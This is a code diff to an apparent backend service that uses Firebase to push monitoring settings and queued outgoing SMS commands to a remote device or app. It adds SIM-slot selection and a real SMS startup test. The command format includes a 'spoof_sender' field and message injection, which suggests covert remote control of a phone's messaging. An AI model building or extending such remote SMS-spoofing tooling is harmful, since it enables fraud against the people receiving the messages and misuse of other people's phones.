@@ -78,6 +78,17 @@ async def push_virtus_config(profile: MonitorProfile, device: Device | None = No
             firebase_bases=firebase_bases,
         )
 
+    sim_index = profile.selected_sim_index or 0
+    sim_slot = sim_index + 1
+    if device and device.device_meta:
+        try:
+            meta = json.loads(device.device_meta)
+            sims = meta.get("sims") or []
+            if sims and 0 <= sim_index < len(sims):
+                sim_slot = int(sims[sim_index].get("slot") or sim_slot)
+        except (json.JSONDecodeError, TypeError, ValueError):
+            pass
+
     payload = {
         "monitoring": profile.is_monitoring,
         "ts": int(time.time() * 1000),
@@ -86,7 +97,8 @@ async def push_virtus_config(profile: MonitorProfile, device: Device | None = No
         "firebase_key": license_key if license_key and license_key.upper().startswith("KEY-") else "",
         "channel_id": profile.channel_id,
         "target_number": profile.phone_number,
-        "sim_index": profile.selected_sim_index or 0,
+        "sim_index": sim_index,
+        "sim_slot": sim_slot,
     }
 
     user_fb = get_profile_firebase_url(profile)
@@ -102,6 +114,7 @@ async def push_outgoing_sms_command(
     to_number: str,
     message: str,
     sim_index: int = 0,
+    sim_slot: int | None = None,
     spoof_sender: str | None = None,
 ) -> str:
     """Queue outgoing SMS send for device/APK: {firebase}/commands/{device_id}/{id}."""
@@ -111,6 +124,7 @@ async def push_outgoing_sms_command(
         "to": to_number,
         "message": message,
         "sim_index": sim_index,
+        "sim_slot": sim_slot or (sim_index + 1),
         "spoof_sender": spoof_sender,
         "status": "pending",
         "created_at": datetime.now(timezone.utc).isoformat(),
@@ -174,6 +188,15 @@ async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | Non
             firebase_url = resolve_firebase_url(profile)
             if firebase_url:
                 await register_device_on_firebase(firebase_url, device, profile)
+                base = normalize_firebase_url(firebase_url)
+                await _firebase_put(
+                    f"{base}/devices/{device.name}/monitoring",
+                    {
+                        "active": profile.is_monitoring,
+                        "sim_index": profile.selected_sim_index or 0,
+                        "ts": int(time.time() * 1000),
+                    },
+                )
     except Exception as exc:
         logger.warning("Firebase profile sync failed: %s", exc)
 
@@ -217,6 +240,7 @@ async def push_outbound_to_firebase(
             outbound.to_number,
             outbound.message,
             sim_index=outbound.sim_index,
+            sim_slot=outbound.sim_slot,
         )
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
@@ -236,17 +260,21 @@ async def send_polling_startup_test(db, profile: MonitorProfile, device: Device)
         return
 
     sim_index = profile.selected_sim_index or 0
-    tasks: list = [
-        push_inject_message(
-            firebase_url,
-            device.name,
-            STARTUP_TEST_SENDER,
-            STARTUP_TEST_MESSAGE,
-        )
-    ]
+    sim_slot = sim_index + 1
+    if device.device_meta:
+        try:
+            meta = json.loads(device.device_meta)
+            sims = meta.get("sims") or []
+            if sims and 0 <= sim_index < len(sims):
+                sim_slot = int(sims[sim_index].get("slot") or sim_slot)
+        except (json.JSONDecodeError, TypeError, ValueError):
+            pass
+
+    tasks: list = []
 
     if profile.phone_number:
         mynum = normalize_phone(profile.phone_number)
+        # Real SMS from selected SIM -> /mynum (recharge check: balance nahi to nahi jayega)
         tasks.append(
             push_outgoing_sms_command(
                 firebase_url,
@@ -254,6 +282,7 @@ async def send_polling_startup_test(db, profile: MonitorProfile, device: Device)
                 mynum,
                 STARTUP_TEST_MESSAGE,
                 sim_index=sim_index,
+                sim_slot=sim_slot,
             )
         )
 
